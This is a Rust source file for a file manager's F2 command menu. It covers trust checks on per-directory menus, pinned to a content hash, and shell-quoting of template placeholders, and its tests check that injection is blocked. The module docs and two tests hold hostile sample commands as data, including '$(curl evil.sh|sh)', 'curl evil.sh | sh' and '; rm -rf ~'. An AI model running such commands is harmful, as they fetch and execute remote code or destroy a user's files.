//! The user menu: what F2 offers, and the reasons it is careful about it.
//!
//! F2 is the only key in this program that runs a command **you** wrote. That
//! one sentence is the whole design brief, and everything below follows from
//! taking it seriously.
//!
//! # What it is
//!
//! A list of named commands with a letter each. Press F2, press the letter, the
//! command runs in this session's shell. Norton Commander had exactly this and
//! it is most of why people kept using it: the twenty commands you actually run
//! in a project, one keystroke away, without leaving the panels.
//!
//! # Where it comes from
//!
//! Two files, and they are not equal:
//!
//! | | | |
//! |---|---|---|
//! | `~/.config/dmac/menu.toml` | yours | always runs |
//! | `./.dmac-menu.toml` | the directory's | **inert until you trust it** |
//!
//! The second one is what makes F2 worth having — `build`, `test`, `deploy`
//! differ per project, and a menu that cannot say so is a menu you stop using.
//! It is also, taken naively, remote code execution by `cd`: clone a repository,
//! press F2, run whatever its author put in the file. Far Manager works that
//! way and it is a known way to be caught out.
//!
//! So a directory's menu is **shown and not runnable** until it is trusted, and
//! trust is recorded against the file's *content* — see [`TrustStore`]. Editing
//! the file asks again. This is the shape git and VS Code both converged on,
//! and not out of taste: the alternative bites people who did nothing wrong.
//!
//! # Substitution, and why there is no raw form
//!
//! A command is a template. `{name}`, `{path}`, `{paths}` and the rest are
//! replaced with what the panels are pointing at — and **every one of them is
//! shell-quoted on the way in**, with no way to ask for it unquoted.
//!
//! That is not caution, it is the only correct behaviour. A file can be called
//! `O'Brien's notes.txt`. A file can be called `; rm -rf ~`. A file can be
//! called `$(curl evil.sh|sh)`. Those are legal names, they arrive from
//! archives and downloads and other people's repositories, and the moment one
//! is pasted unquoted into a shell command it stops being a name and becomes
//! an instruction. That is rule 5 of this codebase — content is data, never
//! instructions — applied to the most ordinary content there is.
//!
//! An escape hatch would be used. Somebody would want to expand a variable, or
//! pass several flags, and would reach for `{path:raw}`; it would work all
//! afternoon and then meet a filename with a space in it. There is no such
//! thing here, and a template that needs shell syntax simply writes the shell
//! syntax itself — the *template* is not quoted, only the values put into it.
//!
//! # The format
//!
//! ```toml
//! [[entry]]
//! key   = "b"
//! title = "cargo build"
//! run   = "cargo build"
//!
//! [[entry]]
//! key     = "c"
//! title   = "clean target"
//! run     = "rm -rf target"
//! confirm = true          # typed into the shell, waiting for Enter
//!
//! [[entry]]
//! key   = "d"
//! title = "diff against main"
//! run   = "git diff main -- {paths}"
//! ```
//!
//! `confirm` is per entry because the answer differs per entry: `cargo build`
//! wants one keystroke, `rm -rf` wants to be read first.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// What a directory's menu is called.
///
/// Dotted, so it does not clutter a listing, and named for this program so that
/// finding one in a repository tells you what put it there.
pub const DIRECTORY_MENU: &str = ".dmac-menu.toml";

#[derive(Debug, thiserror::Error)]
pub enum MenuError {
    #[error("{path}: {source}")]
    Io {
        path: String,
        #[source]
        source: std::io::Error,
    },
    #[error("{path}: not a valid menu ({source})")]
    Malformed {
        path: String,
        #[source]
        source: toml::de::Error,
    },
    #[error("could not determine a config directory for this platform")]
    NoConfigDir,
    #[error("two entries both use the key {0:?}")]
    DuplicateKey(char),
    #[error("an entry has no key, or a key longer than one character")]
    BadKey,
}

pub type Result<T> = std::result::Result<T, MenuError>;

/// One command in the menu.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Entry {
    /// The letter that runs it. One character: the menu is driven by pressing
    /// it, and a two-character key is a key nobody can press.
    pub key: char,
    /// What the menu shows. The command itself is often unreadable — that is
    /// what a title is for.
    pub title: String,
    /// The command, as a template. See the module docs for the placeholders.
    pub run: String,
    /// Type it into the shell and wait for Enter rather than running it.
    ///
    /// Per entry, because the answer is per entry. A build wants one keystroke;
    /// anything that deletes wants to be read first, with the substitutions
    /// already made — which is exactly when a surprising filename shows itself.
    #[serde(default)]
    pub confirm: bool,
}

/// A menu, and where it came from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Menu {
    pub entries: Vec<Entry>,
    pub source: Source,
}

/// Which of the two files a menu came from, which is what decides whether it
/// may run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Source {
    /// `~/.config/dmac/menu.toml`. Yours, and therefore trusted: you are the
    /// only person who can have written it, and if that is not true you have a
    /// larger problem than this menu.
    Global,
    /// A `.dmac-menu.toml` found in a directory. Carries whether it has been
    /// trusted, because everything about how it is drawn and whether it runs
    /// depends on that one bool.
    Directory { path: PathBuf, trusted: bool },
}

impl Source {
    /// Whether entries from this source may actually be run.
    pub fn runnable(&self) -> bool {
        match self {
            Source::Global => true,
            Source::Directory { trusted, .. } => *trusted,
        }
    }
}

#[derive(Debug, Deserialize)]
struct File {
    #[serde(default)]
    entry: Vec<Entry>,
}

impl Menu {
    /// Parse a menu from TOML.
    ///
    /// Duplicate keys are an error rather than a silent first-wins: a menu with
    /// two `b` entries has one the user cannot reach, and finding out which by
    /// experiment is not a thing to make someone do.
    pub fn parse(text: &str, path: &Path, source: Source) -> Result<Self> {
        let file: File = toml::from_str(text).map_err(|source| MenuError::Malformed {
            path: path.display().to_string(),
            source,
        })?;
        let mut seen = std::collections::BTreeSet::new();
        for e in &file.entry {
            if !seen.insert(e.key) {
                return Err(MenuError::DuplicateKey(e.key));
            }
        }
        Ok(Self {
            entries: file.entry,
            source,
        })
    }

    /// The user's own menu, if they have written one.
    ///
    /// `Ok(None)` means there is no file, which is the ordinary case and not an
    /// error — most people never write one.
    pub fn global() -> Result<Option<Self>> {
        let path = global_path()?;
        let Some(text) = read_optional(&path)? else {
            return Ok(None);
        };
        Menu::parse(&text, &path, Source::Global).map(Some)
    }

    /// The menu belonging to `dir`, if it has one, with its trust already
    /// decided.
    ///
    /// The trust is resolved here rather than by the caller so that a `Menu`
    /// cannot exist without an answer to "may this run" attached to it. A
    /// caller that has to remember to check is a caller that will one day
    /// forget, and the failure mode of forgetting is running a stranger's
    /// command.
    pub fn for_directory(dir: &Path, trust: &TrustStore) -> Result<Option<Self>> {
        let path = dir.join(DIRECTORY_MENU);
        let Some(text) = read_optional(&path)? else {
            return Ok(None);
        };
        let trusted = trust.is_trusted(&path, &text);
        let source = Source::Directory {
            path: path.clone(),
            trusted,
        };
        Menu::parse(&text, &path, source).map(Some)
    }

    /// The entry for a key, if there is one.
    pub fn entry(&self, key: char) -> Option<&Entry> {
        // Case-insensitively: the menu shows `b` and someone with caps lock on
        // is not asking for a different command.
        self.entries
            .iter()
            .find(|e| e.key.eq_ignore_ascii_case(&key))
    }
}

/// Which files the user has agreed to run commands from, and what they looked
/// like when they agreed.
///
/// The hash is the point. Trusting a *path* would mean approving a file once
/// and then running whatever it says for ever — including whatever arrived in
/// the next `git pull`, written by somebody else. Trusting *content* means a
/// change is a new question, which is the only version of this that holds up.
///
/// It is stored beside the sessions, in the user's own config directory, and it
/// is not secret: an attacker who can write it can already write the menu.
/// Its value is against the case that actually happens — a repository you
/// cloned to read, and a keystroke you pressed out of habit.
#[derive(Debug, Default)]
pub struct TrustStore {
    path: Option<PathBuf>,
    /// Absolute path of a menu file, to the hash of the content that was
    /// approved.
    trusted: BTreeMap<String, String>,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct PersistedTrust {
    #[serde(default)]
    trusted: BTreeMap<String, String>,
}

impl TrustStore {
    /// Load it, forgivingly. A missing file is nobody having trusted anything
    /// yet; a corrupt one is treated the same way, because the safe direction
    /// for a trust store that cannot be read is "trusts nothing".
    pub fn load() -> Self {
        let Ok(path) = trust_path() else {
            return Self::default();
        };
        let trusted = std::fs::read_to_string(&path)
            .ok()
            .and_then(|t| toml::from_str::<PersistedTrust>(&t).ok())
            .map(|p| p.trusted)
            .unwrap_or_default();
        Self {
            path: Some(path),
            trusted,
        }
    }

    /// A store at an explicit path, for tests that must never touch `$HOME`.
    pub fn at(path: impl Into<PathBuf>) -> Self {
        Self {
            path: Some(path.into()),
            trusted: BTreeMap::new(),
        }
    }

    /// Whether this exact content, at this exact path, has been approved.
    pub fn is_trusted(&self, path: &Path, contents: &str) -> bool {
        self.trusted
            .get(&path.display().to_string())
            .is_some_and(|h| *h == hash(contents))
    }

    /// Approve this content at this path.
    pub fn trust(&mut self, path: &Path, contents: &str) -> Result<()> {
        self.trusted
            .insert(path.display().to_string(), hash(contents));
        self.save()
    }

    /// Withdraw approval. Kept as a real operation rather than something you do
    /// by editing a file: "I should not have trusted that" needs to be one
    /// action, not a hunt through a config directory.
    pub fn forget(&mut self, path: &Path) -> Result<()> {
        self.trusted.remove(&path.display().to_string());
        self.save()
    }

    fn save(&self) -> Result<()> {
        let Some(path) = &self.path else {
            return Ok(());
        };
        let text = toml::to_string_pretty(&PersistedTrust {
            trusted: self.trusted.clone(),
        })
        .unwrap_or_default();
        if let Some(dir) = path.parent() {
            std::fs::create_dir_all(dir).map_err(|source| MenuError::Io {
                path: dir.display().to_string(),
                source,
            })?;
        }
        std::fs::write(path, text).map_err(|source| MenuError::Io {
            path: path.display().to_string(),
            source,
        })
    }
}

/// A content hash, hex. BLAKE3 rather than something quicker: this decides
/// whether a command runs, and a hash you can find a collision for is a hash
/// that decides it for somebody else.
fn hash(contents: &str) -> String {
    blake3::hash(contents.as_bytes()).to_hex().to_string()
}

/// What went wrong expanding a template.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum ExpandError {
    #[error("{{{0}}} is not something this menu can fill in")]
    Unknown(String),
    #[error("a {{ was never closed")]
    Unterminated,
    #[error("{{{0}}} needs something selected, and nothing is")]
    Empty(String),
}

/// Fill a command template in, quoting every value.
///
/// `lookup` answers what a placeholder means: zero values (the panel has
/// nothing selected), one, or many. Whatever comes back is
/// [`shell_quote`](crate::shell_quote)d and, for several, joined with spaces —
/// so `{paths}` becomes `'a b.txt' '/tmp/c'` and never `a b.txt /tmp/c`, which
/// is three arguments where the user meant two.
///
/// `{{` and `}}` are literal braces, because a command may legitimately contain
/// one — `awk '{print $1}'` is not a placeholder, and a menu that could not
/// express it would be a menu people work around.
///
/// An unknown placeholder is an **error**, not a passthrough. Leaving `{nmae}`
/// in the command would run something almost right, which is worse than not
/// running: a typo would reach the shell as a literal brace and be a filename,
/// a glob, or nothing, depending on the shell's mood.
pub fn expand(
    template: &str,
    lookup: &dyn Fn(&str) -> Option<Vec<String>>,
) -> std::result::Result<String, ExpandError> {
    let mut out = String::with_capacity(template.len());
    let mut chars = template.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '{' if chars.peek() == Some(&'{') => {
                chars.next();
                out.push('{');
            }
            '}' if chars.peek() == Some(&'}') => {
                chars.next();
                out.push('}');
            }
            '{' => {
                let mut name = String::new();
                let mut closed = false;
                for n in chars.by_ref() {
                    if n == '}' {
                        closed = true;
                        break;
                    }
                    name.push(n);
                }
                if !closed {
                    return Err(ExpandError::Unterminated);
                }
                let values = lookup(&name).ok_or_else(|| ExpandError::Unknown(name.clone()))?;
                if values.is_empty() {
                    return Err(ExpandError::Empty(name));
                }
                let quoted: Vec<String> = values.iter().map(|v| crate::shell_quote(v)).collect();
                out.push_str(&quoted.join(" "));
            }
            _ => out.push(c),
        }
    }
    Ok(out)
}

/// Every placeholder this understands, for the documentation and for the
/// error message that lists them.
///
/// Kept here rather than in the frontend so that the docs, the error and the
/// code that fills them in cannot drift apart.
pub const PLACEHOLDERS: &[(&str, &str)] = &[
    ("name", "the file under the cursor"),
    ("path", "its full path"),
    ("stem", "its name without the extension"),
    ("ext", "its extension, without the dot"),
    ("names", "every marked file, or the one under the cursor"),
    ("paths", "the same, as full paths"),
    ("dir", "this panel's directory"),
    ("other", "the other panel's directory"),
];

fn read_optional(path: &Path) -> Result<Option<String>> {
    match std::fs::read_to_string(path) {
        Ok(t) => Ok(Some(t)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(source) => Err(MenuError::Io {
            path: path.display().to_string(),
            source,
        }),
    }
}

/// `~/.config/dmac` when it exists, even on macOS — the same rule the session
/// store uses, so a dotfiles repository holds all of it or none of it.
fn config_dir() -> Result<PathBuf> {
    if let Some(home) = std::env::var_os("HOME") {
        let xdg = PathBuf::from(home).join(".config").join("dmac");
        if xdg.exists() {
            return Ok(xdg);
        }
    }
    directories::ProjectDirs::from("", "", "DMACommander")
        .map(|d| d.config_dir().to_path_buf())
        .ok_or(MenuError::NoConfigDir)
}

fn global_path() -> Result<PathBuf> {
    Ok(config_dir()?.join("menu.toml"))
}

fn trust_path() -> Result<PathBuf> {
    Ok(config_dir()?.join("trusted-menus.toml"))
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = r#"
[[entry]]
key = "b"
title = "build"
run = "cargo build"

[[entry]]
key = "c"
title = "clean"
run = "rm -rf target"
confirm = true
"#;

    fn parsed(source: Source) -> Menu {
        Menu::parse(SAMPLE, Path::new("/tmp/menu.toml"), source).expect("parse")
    }

    #[test]
    fn a_menu_is_entries_with_their_letters() {
        let m = parsed(Source::Global);
        assert_eq!(m.entries.len(), 2);
        assert_eq!(m.entry('b').map(|e| e.title.as_str()), Some("build"));
        // Caps lock is not a request for a different command.
        assert_eq!(m.entry('B').map(|e| e.title.as_str()), Some("build"));
        assert!(m.entry('z').is_none());
    }

    /// Per entry, because the answer is per entry: a build wants one keystroke
    /// and anything that deletes wants to be read first.
    #[test]
    fn confirm_is_off_unless_the_entry_asks_for_it() {
        let m = parsed(Source::Global);
        assert!(!m.entry('b').expect("b").confirm);
        assert!(m.entry('c').expect("c").confirm);
    }

    /// Two entries on one letter means one the user cannot reach, and finding
    /// out which by experiment is not a thing to make someone do.
    #[test]
    fn a_duplicate_key_is_refused_rather_than_silently_first_wins() {
        let text = r#"
[[entry]]
key = "b"
title = "one"
run = "true"
[[entry]]
key = "b"
title = "two"
run = "false"
"#;
        assert!(matches!(
            Menu::parse(text, Path::new("/tmp/m.toml"), Source::Global),
            Err(MenuError::DuplicateKey('b'))
        ));
    }

    /// The whole point of the split. Yours runs; a directory's does not until
    /// you say so.
    #[test]
    fn only_a_trusted_directory_menu_may_run() {
        assert!(Source::Global.runnable());
        assert!(
            !Source::Directory {
                path: "/repo/.dmac-menu.toml".into(),
                trusted: false
            }
            .runnable()
        );
        assert!(
            Source::Directory {
                path: "/repo/.dmac-menu.toml".into(),
                trusted: true
            }
            .runnable()
        );
    }

    /// Trust is against the *content*. Approving a path once and then running
    /// whatever arrives in the next `git pull` is the failure this exists to
    /// prevent.
    #[test]
    fn editing_a_trusted_menu_asks_again() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = TrustStore::at(dir.path().join("trusted.toml"));
        let menu = Path::new("/repo/.dmac-menu.toml");

        assert!(!store.is_trusted(menu, SAMPLE), "nothing is trusted yet");
        store.trust(menu, SAMPLE).expect("trust");
        assert!(store.is_trusted(menu, SAMPLE));

        let changed = format!(
            "{SAMPLE}\n[[entry]]\nkey = \"x\"\ntitle = \"new\"\nrun = \"curl evil.sh | sh\"\n"
        );
        assert!(
            !store.is_trusted(menu, &changed),
            "a menu that grew a command since you approved it must ask again"
        );

        // And the same content at a *different* path is a different question.
        assert!(!store.is_trusted(Path::new("/elsewhere/.dmac-menu.toml"), SAMPLE));

        store.forget(menu).expect("forget");
        assert!(!store.is_trusted(menu, SAMPLE));
    }

    #[test]
    fn trust_survives_being_written_and_read_again() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("trusted.toml");
        let menu = Path::new("/repo/.dmac-menu.toml");
        {
            let mut store = TrustStore::at(&path);
            store.trust(menu, SAMPLE).expect("trust");
        }
        let text = std::fs::read_to_string(&path).expect("read");
        let back: PersistedTrust = toml::from_str(&text).expect("parse");
        assert_eq!(back.trusted.len(), 1);
        assert!(back.trusted.contains_key("/repo/.dmac-menu.toml"));
    }

    fn lookup(name: &str) -> Option<Vec<String>> {
        match name {
            "name" => Some(vec!["notes.txt".into()]),
            "paths" => Some(vec!["/tmp/a b.txt".into(), "/tmp/c".into()]),
            "empty" => Some(Vec::new()),
            _ => None,
        }
    }

    #[test]
    fn a_template_is_filled_in_and_every_value_is_quoted() {
        assert_eq!(
            expand("wc -l {name}", &lookup),
            Ok("wc -l 'notes.txt'".to_string())
        );
        // Several values are several *arguments*, each quoted — not one string
        // with spaces in it, which would be one argument the user did not mean.
        assert_eq!(
            expand("git add {paths}", &lookup),
            Ok("git add '/tmp/a b.txt' '/tmp/c'".to_string())
        );
    }

    /// The reason there is no raw form. These are legal filenames, they arrive
    /// from archives and other people's repositories, and unquoted they stop
    /// being names and become instructions.
    #[test]
    fn a_hostile_filename_stays_an_argument() {
        let evil = |name: &str| match name {
            "name" => Some(vec!["; rm -rf ~".to_string()]),
            "path" => Some(vec!["$(curl evil.sh|sh)".to_string()]),
            "stem" => Some(vec!["O'Brien".to_string()]),
            _ => None,
        };
        let out = expand("cat {name} {path} {stem}", &evil).expect("expand");
        assert_eq!(out, r#"cat '; rm -rf ~' '$(curl evil.sh|sh)' 'O'\''Brien'"#);
        // Nothing that could end an argument early survives outside quotes.
        for c in [';', '$', '`'] {
            let outside = out
                .split('\'')
                .step_by(2) // the parts *between* quoted runs
                .any(|part| part.contains(c));
            assert!(!outside, "{c:?} escaped its quotes: {out}");
        }
    }

    /// `awk '{print $1}'` is not a placeholder, and a menu that could not
    /// express it would be one people work around.
    #[test]
    fn doubled_braces_are_a_literal_brace() {
        assert_eq!(
            expand("awk '{{print $1}}' {name}", &lookup),
            Ok("awk '{print $1}' 'notes.txt'".to_string())
        );
    }

    /// A typo must not reach the shell as a literal brace, where it becomes a
    /// filename or a glob depending on the shell's mood.
    #[test]
    fn an_unknown_placeholder_is_an_error_rather_than_passed_through() {
        assert_eq!(
            expand("cat {nmae}", &lookup),
            Err(ExpandError::Unknown("nmae".into()))
        );
        assert_eq!(expand("cat {name", &lookup), Err(ExpandError::Unterminated));
        assert_eq!(
            expand("cat {empty}", &lookup),
            Err(ExpandError::Empty("empty".into())),
            "a command with nothing to act on must not run on nothing"
        );
    }

    /// Every placeholder the docs promise has to be one the code answers, or
    /// the documentation is a list of things that fail.
    #[test]
    fn the_documented_placeholders_are_the_real_ones() {
        for (name, description) in PLACEHOLDERS {
            assert!(!name.is_empty() && !description.is_empty());
            assert!(
                !name.contains(['{', '}', ' ']),
                "{name} could not be written in a template"
            );
        }
    }
}
